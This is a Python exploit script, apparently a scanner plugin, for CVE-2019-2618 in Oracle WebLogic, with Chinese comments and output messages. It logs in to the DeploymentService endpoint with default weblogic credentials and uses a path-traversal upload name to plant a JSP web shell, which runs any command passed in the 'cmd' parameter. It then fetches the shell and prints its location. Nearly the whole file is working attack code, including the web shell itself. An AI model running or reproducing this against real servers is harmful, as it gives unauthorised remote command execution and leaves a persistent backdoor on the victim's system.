#!/usr/bin/env python3

'''
name: CVE-2019-2618漏洞
description: CVE-2019-2618漏洞可执行任意命令
'''

import os
import re
import json
import time
from app.lib.utils.request import request
import binascii

class CVE_2019_2618_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.shell = "shell.jsp"
        self.headers = {
            'content-type': "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
            'username': "weblogic",
            'password': "Oracle@123",
            'wl_request_type': "app_upload",
            'wl_upload_application_name': "../tmp/_WL_internal/bea_wls_deployment_internal/gyuitk/war",
            'wl_upload_delta': "true",
            'archive': "true",
            'cache-control': "no-cache"
        }
        self.file = '''
                    <%@ page import="java.util.*,java.io.*"%>
                        <%
                        %>
                        <HTML><BODY>
                        Commands with JSP
                        <FORM METHOD="GET" NAME="myform" ACTION="">
                        <INPUT TYPE="text" NAME="cmd">
                        <INPUT TYPE="submit" VALUE="Send">
                        </FORM>
                        <pre>
                        <%
                        if (request.getParameter("cmd") != null) {
                        out.println("Command: " + request.getParameter("cmd") + "<BR>");
                        Process p;
                        if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
                            p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
                        }
                        else{
                            p = Runtime.getRuntime().exec(request.getParameter("cmd"));
                        }
                        OutputStream os = p.getOutputStream();
                        InputStream in = p.getInputStream();
                        DataInputStream dis = new DataInputStream(in);
                        String disr = dis.readLine();
                        while ( disr != null ) {
                        out.println(disr);
                        disr = dis.readLine();
                        }
                        }
                        %>
                        </pre>
                        </BODY></HTML>
                '''
        self.payload = "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"shell.jsp\"; filename=\"%s\"\r\nContent-Type: false\r\n\r\n %s \r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--" % (self.shell, self.file)

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            payload_url = self.url + "/bea_wls_deployment_internal/DeploymentService"
            result = request.post(payload_url, headers = self.headers, data = self.payload)
            check = request.get(self.url +  "/bea_wls_deployment_internal/" + self.shell)
            if check.status_code == 200:
                print ("存在CVE-2019-2618漏洞，shell文件路径为："+ self.url +"/bea_wls_deployment_internal/" + self.shell)
                return True
            else:
                print("不存在CVE-2019-2618漏洞")
                return False
        except Exception as e:
            #print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    CVE_2019_2618 = CVE_2019_2618_BaseVerify('http://127.0.0.1:7001')
    CVE_2019_2618.run()


